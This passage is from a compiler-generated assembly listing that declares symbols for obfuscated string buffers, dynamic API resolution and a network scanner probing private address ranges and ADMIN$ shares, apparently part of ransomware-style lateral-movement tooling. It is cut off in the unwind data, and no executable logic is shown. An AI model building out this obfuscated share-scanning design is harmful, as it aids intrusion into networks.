PUBLIC	?isDecrypted@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
PUBLIC	??0?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEAA@PEBE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >
PUBLIC	?isDecrypted@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEBA_NXZ ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEAAPEBDXZ ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::decrypt
PUBLIC	??0?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAA@PEBE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEBA_NXZ ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAAPEBDXZ ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::decrypt
PUBLIC	??0?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAA@PEBE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEBA_NXZ ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAAPEBDXZ ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::decrypt
PUBLIC	??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>
PUBLIC	??$_Convert_size@_K_K@std@@YA_K_K@Z		; std::_Convert_size<unsigned __int64,unsigned __int64>
PUBLIC	??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>
PUBLIC	??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z		; std::_Unfancy<wchar_t>
PUBLIC	??$max@_K@std@@YAAEB_KAEB_K0@Z			; std::max<unsigned __int64>
PUBLIC	??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
PUBLIC	??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
PUBLIC	??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z	; std::addressof<wchar_t *>
PUBLIC	??$min@_K@std@@YAAEB_KAEB_K0@Z			; std::min<unsigned __int64>
PUBLIC	??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >
PUBLIC	??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z ; std::_Allocate<16,std::_Default_allocate_traits,0>
PUBLIC	??$_Get_size_of_n@$01@std@@YA_K_K@Z		; std::_Get_size_of_n<2>
PUBLIC	??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>
PUBLIC	__JustMyCode_Default
PUBLIC	??_7exception@std@@6B@				; std::exception::`vftable'
PUBLIC	??_C@_0BC@EOODALEL@Unknown?5exception@		; `string'
PUBLIC	??_7bad_alloc@std@@6B@				; std::bad_alloc::`vftable'
PUBLIC	??_7bad_array_new_length@std@@6B@		; std::bad_array_new_length::`vftable'
PUBLIC	??_C@_0BF@KINCDENJ@bad?5array?5new?5length@	; `string'
PUBLIC	??_R0?AVexception@std@@@8			; std::exception `RTTI Type Descriptor'
PUBLIC	_CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24
PUBLIC	_TI3?AVbad_array_new_length@std@@
PUBLIC	_CTA3?AVbad_array_new_length@std@@
PUBLIC	??_R0?AVbad_array_new_length@std@@@8		; std::bad_array_new_length `RTTI Type Descriptor'
PUBLIC	_CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24
PUBLIC	??_R0?AVbad_alloc@std@@@8			; std::bad_alloc `RTTI Type Descriptor'
PUBLIC	_CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24
PUBLIC	??_C@_0BA@JFNIOLAK@string?5too?5long@		; `string'
PUBLIC	??_C@_1FA@PDLBHGMH@?$AAG?$AAe?$AAt?$AAI?$AAp?$AAN?$AAe?$AAt?$AAT?$AAa?$AAb?$AAl?$AAe?$AA?5?$AAf@ ; `string'
PUBLIC	??_C@_04OEIIGBBO@172?4@				; `string'
PUBLIC	??_C@_08NABKCMOE@192?4168?4@			; `string'
PUBLIC	??_C@_03LJEAFDJL@10?4@				; `string'
PUBLIC	??_C@_04FAGBOJJK@169?4@				; `string'
PUBLIC	??_C@_1O@IGADBKJD@?$AAA?$AAD?$AAM?$AAI?$AAN?$AA$@ ; `string'
PUBLIC	??_C@_15LEKKCGMK@?$AA?2?$AA?2@			; `string'
PUBLIC	??_C@_13FPGAJAPJ@?$AA?2@			; `string'
PUBLIC	??_C@_1CA@HOLMOEOA@?$AAF?$AAo?$AAu?$AAn?$AAd?$AA?5?$AAs?$AAh?$AAa?$AAr?$AAe?$AA?5?$AA?$CF?$AAs?$AA?4@ ; `string'
PUBLIC	??_C@_1DK@JBOOEPIJ@?$AAS?$AAt?$AAa?$AAr?$AAt?$AAi?$AAn?$AAg?$AA?5?$AAs?$AAe?$AAa?$AAr?$AAc?$AAh@ ; `string'
PUBLIC	??_C@_1CK@KJAPOAIC@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAg?$AAe?$AAt?$AA?5?$AAC?$AAo?$AAn?$AAn?$AAe@ ; `string'
PUBLIC	??_C@_1EC@NEINNOEO@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAc?$AAr?$AAe?$AAa?$AAt?$AAe?$AA?5?$AAi?$AAo@ ; `string'
PUBLIC	??_C@_1CG@ONPGBBAD@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAg?$AAe?$AAt?$AA?5?$AAs?$AAu?$AAb?$AAn?$AAe@ ; `string'
PUBLIC	??_C@_1DE@GMHBIMDA@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAc?$AAr?$AAe?$AAa?$AAt?$AAe?$AA?5?$AAh?$AAo@ ; `string'
PUBLIC	??_C@_1DO@GOJNCDIO@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAc?$AAr?$AAe?$AAa?$AAt?$AAe?$AA?5?$AAp?$AAo@ ; `string'
PUBLIC	??_R4exception@std@@6B@				; std::exception::`RTTI Complete Object Locator'
PUBLIC	??_R3exception@std@@8				; std::exception::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2exception@std@@8				; std::exception::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@exception@std@@8			; std::exception::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4bad_alloc@std@@6B@				; std::bad_alloc::`RTTI Complete Object Locator'
PUBLIC	??_R3bad_alloc@std@@8				; std::bad_alloc::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2bad_alloc@std@@8				; std::bad_alloc::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@bad_alloc@std@@8			; std::bad_alloc::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4bad_array_new_length@std@@6B@		; std::bad_array_new_length::`RTTI Complete Object Locator'
PUBLIC	??_R3bad_array_new_length@std@@8		; std::bad_array_new_length::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2bad_array_new_length@std@@8		; std::bad_array_new_length::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@bad_array_new_length@std@@8	; std::bad_array_new_length::`RTTI Base Class Descriptor at (0,-1,0,64)'
EXTRN	??2@YAPEAX_K@Z:PROC				; operator new
EXTRN	??3@YAXPEAX_K@Z:PROC				; operator delete
EXTRN	__report_rangecheckfailure:PROC
EXTRN	_invalid_parameter_noinfo_noreturn:PROC
EXTRN	memcmp:PROC
EXTRN	memcpy:PROC
EXTRN	wcslen:PROC
EXTRN	free:PROC
EXTRN	__imp_htons:PROC
EXTRN	__imp_WSAGetLastError:PROC
EXTRN	__std_exception_copy:PROC
EXTRN	__std_exception_destroy:PROC
EXTRN	??_Eexception@std@@UEAAPEAXI@Z:PROC		; std::exception::`vector deleting destructor'
EXTRN	??_Ebad_alloc@std@@UEAAPEAXI@Z:PROC		; std::bad_alloc::`vector deleting destructor'
EXTRN	??_Ebad_array_new_length@std@@UEAAPEAXI@Z:PROC	; std::bad_array_new_length::`vector deleting destructor'
EXTRN	?_Xlength_error@std@@YAXPEBD@Z:PROC		; std::_Xlength_error
EXTRN	?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z:PROC	; getapi::GetProcAddressEx2
EXTRN	?m_malloc@@YAPEAX_K@Z:PROC			; m_malloc
EXTRN	?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z:PROC ; threadpool::PutTask
EXTRN	?Write@logs@@YAXPEB_WZZ:PROC			; logs::Write
EXTRN	_CxxThrowException:PROC
EXTRN	_RTC_CheckStackVars:PROC
EXTRN	_RTC_InitBase:PROC
EXTRN	_RTC_Shutdown:PROC
EXTRN	__CheckForDebuggerJustMyCode:PROC
EXTRN	__GSHandlerCheck:PROC
EXTRN	__security_check_cookie:PROC
EXTRN	??_7type_info@@6B@:BYTE				; type_info::`vftable'
EXTRN	__security_cookie:QWORD
;	COMDAT pdata
pdata	SEGMENT
$pdata$RtlSecureZeroMemory DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$RtlSecureZeroMemory
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??2@YAPEAX_KPEAX@Z DD imagerel $LN3
	DD	imagerel $LN3+53
	DD	imagerel $unwind$??2@YAPEAX_KPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?max@?$numeric_limits@_J@std@@SA_JXZ DD imagerel $LN3
	DD	imagerel $LN3+47
	DD	imagerel $unwind$?max@?$numeric_limits@_J@std@@SA_JXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0exception@std@@QEAA@QEBDH@Z DD imagerel $LN3
	DD	imagerel $LN3+116
	DD	imagerel $unwind$??0exception@std@@QEAA@QEBDH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0exception@std@@QEAA@AEBV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+123
	DD	imagerel $unwind$??0exception@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1exception@std@@UEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+77
	DD	imagerel $unwind$??1exception@std@@UEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?what@exception@std@@UEBAPEBDXZ DD imagerel $LN5
	DD	imagerel $LN5+96
	DD	imagerel $unwind$?what@exception@std@@UEBAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gexception@std@@UEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+82
	DD	imagerel $unwind$??_Gexception@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_alloc@std@@AEAA@QEBD@Z DD imagerel $LN3
	DD	imagerel $LN3+95
	DD	imagerel $unwind$??0bad_alloc@std@@AEAA@QEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1bad_alloc@std@@UEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$??1bad_alloc@std@@UEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_alloc@std@@QEAA@AEBV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+77
	DD	imagerel $unwind$??0bad_alloc@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gbad_alloc@std@@UEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+82
	DD	imagerel $unwind$??_Gbad_alloc@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_array_new_length@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+84
	DD	imagerel $unwind$??0bad_array_new_length@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1bad_array_new_length@std@@UEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$??1bad_array_new_length@std@@UEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_array_new_length@std@@QEAA@AEBV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+77
